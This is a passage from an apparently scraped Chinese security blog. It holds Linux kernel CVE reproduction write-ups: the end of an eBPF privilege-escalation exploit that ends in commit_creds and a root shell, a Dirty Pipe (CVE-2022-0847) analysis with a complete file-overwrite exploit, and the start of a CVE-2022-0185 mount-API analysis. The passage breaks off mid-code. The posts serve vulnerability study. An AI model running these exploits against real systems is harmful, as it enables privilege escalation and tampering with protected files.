!= run_bpf_prog(read_map_addr_ops, sizeof(read_map_addr_ops) / sizeof(struct bpf_insn), 1, NULL))        err_exit(&quot;[-] Failed to run bpf program\\n&quot;);    if (0 != lookup_map_element(map_fd, 0, values))        err_exit(&quot;[-] Failed to lookup map element\\n&quot;);    uint64_t map_ptr = *(uint64_t *)(values + 8);    printf(&quot;map_ptr =&gt; %p\\n&quot;, map_ptr);    uint64_t map_value = map_ptr - 0xc0 + 0x110;    printf(&quot;map_value =&gt; %p\\n&quot;, map_value);    read_kernel(map_fd, map_fd2, map_ptr, values, 0x8);    printf(&quot;%p\\n&quot;, *(uint64_t *)values);    memset(values, 0, 0x1000);    read_kernel(map_fd, map_fd2, array_map_ops, values, 0xf0);    char map_ops[0x1000] = &#123;0&#125;;    *(uint64_t *)(values + 8 * 4) = work_for_cpu_fn_addr;    memcpy(map_ops, values, 0xf0);    if (0 != update_map_element(map_fd2, 0, map_ops, BPF_ANY))        err_exit(&quot;[-] failed to update map element values!\\n&quot;);    struct bpf_insn modify_oob_map[] =        &#123;            attack(map_fd, map_fd2),            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x110),            BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_6),            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0x8),            BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0x10),            BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_8, 0x18),            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 0x20),            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_1, 0x28),            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_2, 0),            BPF_EXIT_INSN()&#125;;    memset(values, 0, 0x1000);    *(uint64_t *)(values + 0x8) = commit_creds_addr;    *(uint64_t *)(values + 0x10) = init_creds_addr;    *(uint64_t *)(values + 0x18) = map_value;    if (0 != update_map_element(map_fd, 0, values, BPF_ANY))        err_exit(&quot;[-] failed to update map element values!\\n&quot;);    if (0 != run_bpf_prog(modify_oob_map, sizeof(modify_oob_map) / sizeof(struct bpf_insn), 1, NULL))        err_exit(&quot;[-] Failed to run bpf program\\n&quot;);    unsigned long key = 0;    unsigned long next_key;    union bpf_attr attr = &#123;        .map_fd = map_fd2,        .key = &amp;key,        .next_key = &amp;next_key&#125;;    map_get_next_key(&amp;attr);    printf(&quot;[+] commit_cred(&amp;init_cred) done!\\n&quot;);    get_shell();    return 0;&#125;\n\n\n值得注意的在linux kernel 5.11.16版本以后的 ALU sanitation 机制发生了改变，一是alu_limit计算方法变了，不再用指针寄存器的位置来计算，而是使用offset寄存器。例如，假设有个寄存器的无符号边界是 umax_value = 1, umin_value = 0，则计算出 alu_limit = 1，表示如果该寄存器在运行时超出边界，则指针运算不会使用该寄存器。二是在runtime时会用立即数替换掉 verifier 认定为常数的寄存器。例如，BPF_ALU64_REG(BPF_ADD, BPF_REG_2, EXPLOIT_REG) ，EXPLOIT_REG被verifier认定为0，但运行时为1，则将该指令改为 BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0)。\nbool off_is_imm = tnum_is_const(off_reg-&gt;var_off);alu_state |= off_is_imm ? BPF_ALU_IMMEDIATE : 0;isimm = aux-&gt;alu_state &amp; BPF_ALU_IMMEDIATE;// ... ...if (isimm) &#123;        *patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit);&#125; else &#123;         // Patch alu_limit check instructions         // ... ...&#125;\n\n\n\n\n参考链接:\n​    https://elixir.bootlin.com/linux/v5.11.16/source\n​    https://www.anquanke.com/post/id/251933#h2-1\n","categories":["Linux Kernel","CVE复现"],"tags":["ebpf"]},{"title":"CVE-2022-0847 Dirty Pipe","url":"/2022/11/22/CVE-2022-0847-Dirty-Pipe/","content":"前言持续性摆烂一段时间了，又想看jyy的课，又要期末考试了，好烦！索性花点时间把Gyan神上半年叫我复现的CVE复现了。\n这个CVE允许向任意可读文件中写数据，可造成非特权进程向root进程注入代码。该漏洞发生linux内核空间通过splice方式实现数据拷贝时，以”零拷贝”的形式将文件发送到pipe，并且没有初始化pipe缓存页管理数据结构的flag成员。\n零拷贝首先需要了解一下零拷贝的概念，在普通的文件传输过程是如下图所示，可以看到这里进行了四次上下文切换，导致不必要的浪费和开销\n\n所以linux内核出现了解决办法就是可以快速高效地将数据从文件系统移动到网络接口，而不需要将其从内核空间复制到用户空间，而这也就是所谓的零拷贝，在linux内核中有splice方式来解决。\n这个系统调用不仅支持网络层面的传输，如果用户拥有两个已经打开的文件描述符可以任意文件相互连接，而不仅限于socket。\npipe原理pipe在前面的利用中也使用到过，不过大多是利用它申请的结构体的堆块劫持ops或者泄漏，这里主要是使用他初始化会带来的内容。\n首先我们清楚pipe会创建两个文件描述符，一个是输入另一个输出。在内核中pipe缓冲区的总长度是65536字节，一共16页，这里页与页之间不连续是通过数组进行管理的，维护的是一个类似于链表的结构。以前就提到过，pipe在内核中是下图这样的表现形式：\n\n有pipe_buffer结构体只想page，而pipe_buffer结构体在往期kernel中有详细介绍，这里就不再赘述了。\nstatic ssize_tpipe_write(struct kiocb *iocb, struct iov_iter *from)&#123;\tstruct file *filp = iocb-&gt;ki_filp;\tstruct pipe_inode_info *pipe = filp-&gt;private_data;\tunsigned int head;\tssize_t ret = 0;\tsize_t total_len = iov_iter_count(from);\tssize_t chars;\tbool was_empty = false;\tbool wake_next_writer = false;\t/* Null write succeeds. */\tif (unlikely(total_len == 0))\t\treturn 0;\t__pipe_lock(pipe);\tif (!pipe-&gt;readers) &#123;\t\tsend_sig(SIGPIPE, current, 0);\t\tret = -EPIPE;\t\tgoto out;\t&#125;#ifdef CONFIG_WATCH_QUEUE\tif (pipe-&gt;watch_queue) &#123;\t\tret = -EXDEV;\t\tgoto out;\t&#125;#endif\t/*\t * Only wake up if the pipe started out empty, since\t * otherwise there should be no readers waiting.\t *\t * If it wasn&#x27;t empty we try to merge new data into\t * the last buffer.\t *\t * That naturally merges small writes, but it also\t * page-aligs the rest of the writes for large writes\t * spanning multiple pages.\t */\thead = pipe-&gt;head;\twas_empty = pipe_empty(head, pipe-&gt;tail);\tchars = total_len &amp; (PAGE_SIZE-1);\tif (chars &amp;&amp; !was_empty) &#123;\t\tunsigned int mask = pipe-&gt;ring_size - 1;\t\tstruct pipe_buffer *buf = &amp;pipe-&gt;bufs[(head - 1) &amp; mask];\t\tint offset = buf-&gt;offset + buf-&gt;len;\t\tif ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;\t\t    offset + chars &lt;= PAGE_SIZE) &#123;\t\t\tret = pipe_buf_confirm(pipe, buf);\t\t\tif (ret)\t\t\t\tgoto out;\t\t\tret = copy_page_from_iter(buf-&gt;page, offset, chars, from);\t\t\tif (unlikely(ret &lt; chars)) &#123;\t\t\t\tret = -EFAULT;\t\t\t\tgoto out;\t\t\t&#125;\t\t\tbuf-&gt;len += ret;\t\t\tif (!iov_iter_count(from))\t\t\t\tgoto out;\t\t&#125;\t&#125;\tfor (;;) &#123;\t\tif (!pipe-&gt;readers) &#123;\t\t\tsend_sig(SIGPIPE, current, 0);\t\t\tif (!ret)\t\t\t\tret = -EPIPE;\t\t\tbreak;\t\t&#125;\t\thead = pipe-&gt;head;\t\tif (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;\t\t\tunsigned int mask = pipe-&gt;ring_size - 1;\t\t\tstruct pipe_buffer *buf = &amp;pipe-&gt;bufs[head &amp; mask];\t\t\tstruct page *page = pipe-&gt;tmp_page;\t\t\tint copied;\t\t\tif (!page) &#123;\t\t\t\tpage = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);\t\t\t\tif (unlikely(!page)) &#123;\t\t\t\t\tret = ret ? : -ENOMEM;\t\t\t\t\tbreak;\t\t\t\t&#125;\t\t\t\tpipe-&gt;tmp_page = page;\t\t\t&#125;\t\t\t/* Allocate a slot in the ring in advance and attach an\t\t\t * empty buffer.  If we fault or otherwise fail to use\t\t\t * it, either the reader will consume it or it&#x27;ll still\t\t\t * be there for the next write.\t\t\t */\t\t\tspin_lock_irq(&amp;pipe-&gt;rd_wait.lock);\t\t\thead = pipe-&gt;head;\t\t\tif (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;\t\t\t\tspin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);\t\t\t\tcontinue;\t\t\t&#125;\t\t\tpipe-&gt;head = head + 1;\t\t\tspin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);\t\t\t/* Insert it into the buffer array */\t\t\tbuf = &amp;pipe-&gt;bufs[head &amp; mask];\t\t\tbuf-&gt;page = page;\t\t\tbuf-&gt;ops = &amp;anon_pipe_buf_ops;\t\t\tbuf-&gt;offset = 0;\t\t\tbuf-&gt;len = 0;\t\t\tif (is_packetized(filp))\t\t\t\tbuf-&gt;flags = PIPE_BUF_FLAG_PACKET;\t\t\telse\t\t\t\tbuf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;\t\t\tpipe-&gt;tmp_page = NULL;\t\t\tcopied = copy_page_from_iter(page, 0, PAGE_SIZE, from);\t\t\tif (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;\t\t\t\tif (!ret)\t\t\t\t\tret = -EFAULT;\t\t\t\tbreak;\t\t\t&#125;\t\t\tret += copied;\t\t\tbuf-&gt;offset = 0;\t\t\tbuf-&gt;len = copied;\t\t\tif (!iov_iter_count(from))\t\t\t\tbreak;\t\t&#125;\t\tif (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))\t\t\tcontinue;\t\t/* Wait for buffer space to become available. */\t\tif (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;\t\t\tif (!ret)\t\t\t\tret = -EAGAIN;\t\t\tbreak;\t\t&#125;\t\tif (signal_pending(current)) &#123;\t\t\tif (!ret)\t\t\t\tret = -ERESTARTSYS;\t\t\tbreak;\t\t&#125;\t\t/*\t\t * We&#x27;re going to release the pipe lock and wait for more\t\t * space. We wake up any readers if necessary, and then\t\t * after waiting we need to re-check whether the pipe\t\t * become empty while we dropped the lock.\t\t */\t\t__pipe_unlock(pipe);\t\tif (was_empty) &#123;\t\t\twake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);\t\t\tkill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);\t\t&#125;\t\twait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));\t\t__pipe_lock(pipe);\t\twas_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);\t\twake_next_writer = true;\t&#125;out:\t......&#125;\n\n可以看到在上半部分的会验证待输入的内容和当前页内已输入的内容长度是否超过PAGE_SIZE，然后验证buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE如果通过则会进行copy操作。\n如果未通过上半部分的验证则不会进入out，则会进入下方的for循环内，下面会新生成一个page，并且初始化buf\n注意：这里默认的buf-&gt;flag = PIPE_BUF_FLAG_CAN_MERGE\n漏洞分析linux 内核page cache机制linux 通过将打开的文件放到缓存页之中，缓存页被使用过后也会保存一段时间避免不必要的IO操作。短时间内访问同一个文件，都会操作相同的文件缓存页，而不是反复打开。而我们通过该方法篡改了这个文件缓存页，则短时间内访问(读取)该文件的操作都会读到被我们篡改的文件缓存页上，完成利用。\n漏洞原理splice 的零拷贝方法就是，直接用文件缓存页来替换pipe 中的缓存页(更改pipe缓存页指针指向文件缓存页)\n这里漏洞出现在:\nstatic size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes,\t\t\t struct iov_iter *i)&#123;\tstruct pipe_inode_info *pipe = i-&gt;pipe;\tstruct pipe_buffer *buf;\tunsigned int p_tail = pipe-&gt;tail;\tunsigned int p_mask = pipe-&gt;ring_size - 1;\tunsigned int i_head = i-&gt;head;\tsize_t off;\tif (unlikely(bytes &gt; i-&gt;count))\t\tbytes = i-&gt;count;\tif (unlikely(!bytes))\t\treturn 0;\tif (!sanity(i))\t\treturn 0;\toff = i-&gt;iov_offset;\tbuf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];\tif (off) &#123;\t\tif (offset == off &amp;&amp; buf-&gt;page == page) &#123;\t\t\t/* merge with the last one */\t\t\tbuf-&gt;len += bytes;\t\t\ti-&gt;iov_offset += bytes;\t\t\tgoto out;\t\t&#125;\t\ti_head++;\t\tbuf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];\t&#125;\tif (pipe_full(i_head, p_tail, pipe-&gt;max_usage))\t\treturn 0;\tbuf-&gt;ops = &amp;page_cache_pipe_buf_ops;\tget_page(page);\tbuf-&gt;page = page;\tbuf-&gt;offset = offset;\tbuf-&gt;len = bytes;\tpipe-&gt;head = i_head + 1;\ti-&gt;iov_offset = offset + bytes;\ti-&gt;head = i_head;out:\ti-&gt;count -= bytes;\treturn bytes;&#125;\n\n可以看到这里在最后是将page直接赋值给了buf，并且未初始化flag。如果我们修改page为目标文件，并且没有修改flag，那么我们可以直接使用pipe_write进行写。\n\n利用思路\n首先生成管道，并使用write填满所有管道 (下面截图中第一个结构体为pipe_inode_info)\n\n\n\n随后read出所有pipe，head和tail相等，清空pipe\n\n\n\n通过splice修改pipe-&gt;bufs-&gt;page指向文件缓存页\n最后通过pipe_write写入内容\n\n综上，得出exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/mman.h&gt;#include &lt;signal.h&gt;#include &lt;sys/prctl.h&gt;#ifndef PAGE_SIZE#define PAGE_SIZE 4096#endifint main()&#123;    int p[2];    int count;    char buffer[4096];    loff_t offset = 1;    char data[] = &quot;196082&quot;;    int data_size = 6;    int fd = open(&quot;/flag&quot;, O_RDONLY);    if (fd &lt; 0)    &#123;        printf(&quot;[-] open failed!\\n&quot;);        exit(-1);    &#125;    if (pipe(p))        abort();    for (int i = 0; i &lt; 16; i++)    &#123;        write(p[1], buffer, sizeof(buffer));    &#125;    for (int i = 0; i &lt; 16; i++)    &#123;        read(p[0], buffer, sizeof(buffer));    &#125;    ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);    if (nbytes &lt; 0)    &#123;        printf(&quot;[-] splice failed!\\n&quot;);        exit(-1);    &#125;    if (nbytes == 0)    &#123;        printf(&quot;[-] short splice!\\n&quot;);        exit(-1);    &#125;    nbytes = write(p[1], data, data_size);    if (nbytes &lt; 0)    &#123;        printf(&quot;[-] write failed!\\n&quot;);        exit(-1);    &#125;    if (nbytes == 0)    &#123;        printf(&quot;[-] short write!\\n&quot;);        exit(-1);    &#125;    printf(&quot;success!\\n&quot;);    return 0;&#125;\n\n\n\n总的来说，这个CVE的利用不算是很难，后续我会将复现环境都打包到github上\n参考链接:\nhttps://mp.weixin.qq.com/s/6VhWBOzJ7uu80nzFxe5jpg\nhttps://dirtypipe.cm4all.com/\n打包链接:\nhttps://github.com/196082/196082\n","categories":["Linux Kernel","CVE复现"],"tags":["零拷贝","pipe"]},{"title":"CVE-2022-0185复现","url":"/2023/10/15/CVE-2022-0185/","content":"前言其实并不是很想复现这个洞，但是在前些天fmyy告诉了我一个利用方式fuse，虽然他也给我推荐了对应的CVE，不过我更加愿意看墨晚鸢佬的博客。这个CVE复现结束之后应该会有很长一段时间不会继续复现CVE了，后续的打算是更多的学习kernel fuzz。\nhttps://www.willsroot.io/2022/01/cve-2022-0185.html 这里是这个CVE发现者的文章，里面提到了其是被syzkaller给fuzz出来的。\nFilesystem mount API 分析在Linux下的文件系统的挂载，mount 系统调用被用以将文件系统挂载到以 / 为根节点的文件树上，例如我们可以用如下命令挂载硬盘 /dev/sdb1 到 /mnt/temp 目录下，之后就能在该目录下进行文件访问：\nsudo mount /dev/sdb1 /mnt/temp\n\n#include &lt;stdio.h&gt;#include &lt;sys/mount.h&gt;int main(int argc, char **argv, char **envp)&#123;    if (argc &lt; 4) &#123;        puts(&quot;[-] Usage: moount &#123;dev_path&#125; &#123;mount_point&#125; &#123;fs_type&#125;&quot;)    &#125;    if (mount(argv[1], argv[2], argv[3], 0, NULL)) &#123;        printf(&quot;[x] Failed to mount %s at %s by file system type: %s!\\n&quot;,               argv[1], argv[2], argv[3]);    &#125; else &#123;        printf(&quot;[+] Successful to mount %s at %s by file system type: %s.\\n&quot;,               argv[1], argv[2], argv[3]);    &#125;        return 0;&#125;\n\n然而新的mount API将上面的一个简单的mount系统调用的功能拆分成了多个新的系统调用，多个系统调用分别对应了不同文件系统挂载阶段。\nfsopen在Linux中一直秉持着一切皆文件的思想，在新的mount API中也有对应的映照，首先则是fsopen就类似于open系统调用，其用于打开一个文件系统，并返回一个文件系统描述符(称为文件系统上下文)。\n由于标准库中还未添加其相关代码，因此需要手写raw syscall来进行相关的系统调用，例如我们可以使用如下代码打开一个空白的 ext4 文件系统上下文（需要 CAP_SYS_ADMIN 权限，或是开启了 unprivileged namespace 的情况下使用 unshare() 系统调用创建带有该权限的 namespace）：\n#include &lt;sys/syscall.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#ifndef __NR_fsopen#define __NR_fsopen 430#endifint fsopen(const char *fs_name, unsigned int flags)&#123;    return syscall(__NR_fsopen, fs_name, flags);&#125;int main(int argc, char **argv, char **envp)&#123;    int fs_fd;        fs_fd = fsopen(&quot;ext4&quot;, 0);    if (fs_fd &lt; 0) &#123;        puts(&quot;[x] FAILED to fsopen!&quot;);        return -1;    &#125;    printf(&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\\n&quot;, fs_fd);    return 0;&#125;\n\n这里创建的是一个空白的文件系统上下文，并没有与任何的实际设备进行关联。\nSYSCALL_DEFINE2(fsopen, const char __user *, _fs_name, unsigned int, flags)&#123;\tstruct file_system_type *fs_type;\tstruct fs_context *fc;\tconst char *fs_name;\tint ret;\tif (!ns_capable(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN))\t\treturn -EPERM;\tif (flags &amp; ~FSOPEN_CLOEXEC)\t\treturn -EINVAL;\tfs_name = strndup_user(_fs_name, PAGE_SIZE);\tif (IS_ERR(fs_name))\t\treturn PTR_ERR(fs_name);\tfs_type = get_fs_type(fs_name);\tkfree(fs_name);\tif (!fs_type)\t\treturn -ENODEV;\tfc = fs_context_for_mount(fs_type, 0);\tput_filesystem(fs_type);\tif (IS_ERR(fc))\t\treturn PTR_ERR(fc);\tfc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;\tret = fscontext_alloc_log(fc);\tif (ret &lt; 0)\t\tgoto err_fc;\treturn fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : 0);err_fc:\tput_fs_context(fc);\treturn ret;&#125;\n\n在内核中调用fsopen的会进入到如上函数，最终会在fscontext_create_fd函数创建一个file结构体，并且返回文件描述符。\nfscontext_alloc_log通过名字可以看出来这里分配的是用于log的内存。\nfs_context_for_mount这个函数的返回值的类型为fs_context，其作用也就是创建一个文件系统上下文结构体。\nstrndup_user函数则是获取用户态传入的文件系统名，get_fs_type这里是获取其type。\n/* * Filesystem context for holding the parameters used in the creation or * reconfiguration of a superblock. * * Superblock creation fills in -&gt;root whereas reconfiguration begins with this * already set. * * See Documentation/filesystems/mount_api.txt */struct fs_context &#123;\tconst struct fs_context_operations *ops;\tstruct mutex\t\tuapi_mutex;\t/* Userspace access mutex */\tstruct file_system_type\t*fs_type;\tvoid\t\t\t*fs_private;\t/* The filesystem&#x27;s context */\tvoid\t\t\t*sget_key;\tstruct dentry\t\t*root;\t\t/* The root and superblock */\tstruct user_namespace\t*user_ns;\t/* The user namespace for this mount */\tstruct net\t\t*net_ns;\t/* The network namespace for this mount */\tconst struct cred\t*cred;\t\t/* The mounter&#x27;s credentials */\tstruct fc_log\t\t*log;\t\t/* Logging buffer */\tconst char\t\t*source;\t/* The source name (eg. dev path) */\tvoid\t\t\t*security;\t/* Linux S&amp;M options */\tvoid\t\t\t*s_fs_info;\t/* Proposed s_fs_info */\tunsigned int\t\tsb_flags;\t/* Proposed superblock flags (SB_*) */\tunsigned int\t\tsb_flags_mask;\t/* Superblock flags that were changed */\tunsigned int\t\ts_iflags;\t/* OR&#x27;d with sb-&gt;s_iflags */\tunsigned int\t\tlsm_flags;\t/* Information flags from the fs to the LSM */\tenum fs_context_purpose\tpurpose:8;\tenum fs_context_phase\tphase:8;\t/* The phase the context is in */\tbool\t\t\tneed_free:1;\t/* Need to call ops-&gt;free() */\tbool\t\t\tglobal:1;\t/* Goes into &amp;init_user_ns */&#125;;\n\n上面是fs_context结构体的定义，前面提到其是通过fs_context_for_mount函数申请的，这个函数内部是直接调用了alloc_fs_context函数\n/** * alloc_fs_context - Create a filesystem context. * @fs_type: The filesystem type. * @reference: The dentry from which this one derives (or NULL) * @sb_flags: Filesystem/superblock flags (SB_*) * @sb_flags_mask: Applicable members of @sb_flags * @purpose: The purpose that this configuration shall be used for. * * Open a filesystem and create a mount context.  The mount context is * initialised with the supplied flags and, if a submount/automount from * another superblock (referred to by @reference) is supplied, may have * parameters such as namespaces copied across from that superblock. */static struct fs_context *alloc_fs_context(struct file_system_type *fs_type,\t\t\t\t      struct dentry *reference,\t\t\t\t      unsigned int sb_flags,\t\t\t\t      unsigned int sb_flags_mask,\t\t\t\t      enum fs_context_purpose purpose)&#123;\tint (*init_fs_context)(struct fs_context *);\tstruct fs_context *fc;\tint ret = -ENOMEM;\tfc = kzalloc(sizeof(struct fs_context), GFP_KERNEL);\tif (!fc)\t\treturn ERR_PTR(-ENOMEM);\tfc-&gt;purpose\t= purpose;\tfc-&gt;sb_flags\t= sb_flags;\tfc-&gt;sb_flags_mask = sb_flags_mask;\tfc-&gt;fs_type\t= get_filesystem(fs_type);\tfc-&gt;cred\t= get_current_cred();\tfc-&gt;net_ns\t= get_net(current-&gt;nsproxy-&gt;net_ns);\tmutex_init(&amp;fc-&gt;uapi_mutex);\tswitch (purpose) &#123;\tcase FS_CONTEXT_FOR_MOUNT:\t\tfc-&gt;user_ns = get_user_ns(fc-&gt;cred-&gt;user_ns);\t\tbreak;\tcase FS_CONTEXT_FOR_SUBMOUNT:\t\tfc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);\t\tbreak;\tcase FS_CONTEXT_FOR_RECONFIGURE:\t\tatomic_inc(&amp;reference-&gt;d_sb-&gt;s_active);\t\tfc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);\t\tfc-&gt;root = dget(reference);\t\tbreak;\t&#125;\t/* TODO: Make all filesystems support this unconditionally */\tinit_fs_context = fc-&gt;fs_type-&gt;init_fs_context;\tif (!init_fs_context)\t\tinit_fs_context = legacy_init_fs_context;\tret = init_fs_context(fc);\tif (ret &lt; 0)\t\tgoto err_fc;\tfc-&gt;need_free = true;\treturn fc;err_fc:\tput_fs_context(fc);\treturn ERR_PTR(ret);&#125;\n\n首先这里通过kzalloc函数分配一个堆块给到了fs_context结构体，后续设置其对应的属性，接着设置其命名空间，最后则是进行初始化。\n在完成了前面的操作之后，最终进行具体文件系统对应初始化工作的其实是调用 file_system_type 中的 init_fs_context 函数指针对应的函数完成的，这里我们可以看到对于未设置 init_fs_context 的文件系统类型而言其最终会调用 legacy_init_fs_context() 进行初始化\nstatic int legacy_init_fs_context(struct fs_context *fc)&#123;\tfc-&gt;fs_private = kzalloc(sizeof(struct legacy_fs_context), GFP_KERNEL);\tif (!fc-&gt;fs_private)\t\treturn -ENOMEM;\tfc-&gt;ops = &amp;legacy_fs_context_ops;\treturn 0;&#125;\n\n这里的主要操作是给fs_context-&gt;fs_private分配legacy_fs_context结构体，并赋值其ops为legacy_fs_context_ops。\nstruct legacy_fs_context &#123;\tchar\t\t\t*legacy_data;\t/* Data page for legacy filesystems */\tsize_t\t\t\tdata_size;\tenum legacy_fs_param\tparam_type;&#125;;\n\n结构体定义如上，标识了一块指定长度与类型的缓冲区。\nfsconfig在完成了空白的文件系统上下文的创建之后，我们还需要对其进行相应的配置，以便于后续的挂载操作，这个配置的功能对应到的就是 fsconfig() 系统调用\n#include &lt;sys/syscall.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;linux/mount.h&gt;#ifndef __NR_fsopen#define __NR_fsopen 430#endif#ifndef __NR_fsconfig#define __NR_fsconfig 431#endifint fsopen(const char *fs_name, unsigned int flags)&#123;    return syscall(__NR_fsopen, fs_name, flags);&#125;int fsconfig(int fsfd, unsigned int cmd, const char *key, const void *val, int aux)&#123;    return syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);&#125;int main(int argc, char **argv, char **envp)&#123;    int fs_fd;        fs_fd = fsopen(&quot;ext4&quot;, 0);    if (fs_fd &lt; 0) &#123;        puts(&quot;[x] FAILED to fsopen!&quot;);        return -1;    &#125;    printf(&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\\n&quot;, fs_fd);    fsconfig(fs_fd, FSCONFIG_SET_STRING, &quot;source&quot;, &quot;/dev/sdb1&quot;, 0);    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, NULL, NULL, 0);    return 0;&#125;\n\nfsconfig() 系统调用根据不同的 cmd 进行不同的操作，对于挂载文件系统而言其核心操作主要就是两个 cmd：\n\n  FSCONFIG_SET_STRING ：设置不同的键值对参数\n  FSCONFIG_CMD_CREATE：获得一个 superblock 并创建一个 root entry\n\n示例用法如上所示，这里创建了一个键值对 &quot;source&quot;=/dev/sdb1 表示文件系统源所在的设备名\n在内核中也是fsconfig的实现也是比较长，主要根据不同的cmd进入到不同的swith分支\nSYSCALL_DEFINE5(fsconfig,\t\tint, fd,\t\tunsigned int, cmd,\t\tconst char __user *, _key,\t\tconst void __user *, _value,\t\tint, aux)&#123;\tstruct fs_context *fc;\tstruct fd f;\tint ret;\tstruct fs_parameter param = &#123;\t\t.type\t= fs_value_is_undefined,\t&#125;;\tif (fd &lt; 0)\t\treturn -EINVAL;\tswitch (cmd) &#123;\tcase FSCONFIG_SET_FLAG:\t\tif (!_key || _value || aux)\t\t\treturn -EINVAL;\t\tbreak;\tcase FSCONFIG_SET_STRING:\t\tif (!_key || !_value || aux)\t\t\treturn -EINVAL;\t\tbreak;\tcase FSCONFIG_SET_BINARY:\t\tif (!_key || !_value || aux &lt;= 0 || aux &gt; 1024 * 1024)\t\t\treturn -EINVAL;\t\tbreak;\tcase FSCONFIG_SET_PATH:\tcase FSCONFIG_SET_PATH_EMPTY:\t\tif (!_key || !_value || (aux != AT_FDCWD &amp;&amp; aux &lt; 0))\t\t\treturn -EINVAL;\t\tbreak;\tcase FSCONFIG_SET_FD:\t\tif (!_key || _value || aux &lt; 0)\t\t\treturn -EINVAL;\t\tbreak;\tcase FSCONFIG_CMD_CREATE:\tcase FSCONFIG_CMD_RECONFIGURE:\t\tif (_key || _value || aux)\t\t\treturn -EINVAL;\t\tbreak;\tdefault:\t\treturn -EOPNOTSUPP;\t&#125;\tf = fdget(fd);\tif (!f.file)\t\treturn -EBADF;\tret = -EINVAL;\tif (f.file-&gt;f_op != &amp;fscontext_fops)\t\tgoto out_f;\tfc = f.file-&gt;private_data;\tif (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123;\t\tswitch (cmd) &#123;\t\tcase FSCONFIG_SET_BINARY:\t\tcase FSCONFIG_SET_PATH:\t\tcase FSCONFIG_SET_PATH_EMPTY:\t\tcase FSCONFIG_SET_FD:\t\t\tret = -EOPNOTSUPP;\t\t\tgoto out_f;\t\t&#125;\t&#125;\tif (_key) &#123;\t\tparam.key = strndup_user(_key, 256);\t\tif (IS_ERR(param.key)) &#123;\t\t\tret = PTR_ERR(param.key);\t\t\tgoto out_f;\t\t&#125;\t&#125;\tswitch (cmd) &#123;\tcase FSCONFIG_SET_FLAG:\t\tparam.type = fs_value_is_flag;\t\tbreak;\tcase FSCONFIG_SET_STRING:\t\tparam.type = fs_value_is_string;\t\tparam.string = strndup_user(_value, 256);\t\tif (IS_ERR(param.string)) &#123;\t\t\tret = PTR_ERR(param.string);\t\t\tgoto out_key;\t\t&#125;\t\tparam.size = strlen(param.string);\t\tbreak;\tcase FSCONFIG_SET_BINARY:\t\tparam.type = fs_value_is_blob;\t\tparam.size = aux;\t\tparam.blob = memdup_user_nul(_value, aux);\t\tif (IS_ERR(param.blob)) &#123;\t\t\tret = PTR_ERR(param.blob);\t\t\tgoto out_key;\t\t&#125;\t\tbreak;\tcase FSCONFIG_SET_PATH:\t\tparam.type = fs_value_is_filename;\t\tparam.name = getname_flags(_value, 0, NULL);\t\tif (IS_ERR(param.name)) &#123;\t\t\tret = PTR_ERR(param.name);\t\t\tgoto out_key;\t\t&#125;\t\tparam.dirfd = aux;\t\tparam.size = strlen(param.name-&gt;name);\t\tbreak;\tcase FSCONFIG_SET_PATH_EMPTY:\t\tparam.type = fs_value_is_filename_empty;\t\tparam.name = getname_flags(_value, LOOKUP_EMPTY, NULL);\t\tif (IS_ERR(param.name)) &#123;\t\t\tret = PTR_ERR(param.name);\t\t\tgoto out_key;\t\t&#125;\t\tparam.dirfd = aux;\t\tparam.size = strlen(param.name-&gt;name);\t\tbreak;\tcase FSCONFIG_SET_FD:\t\tparam.type = fs_value_is_file;\t\tret = 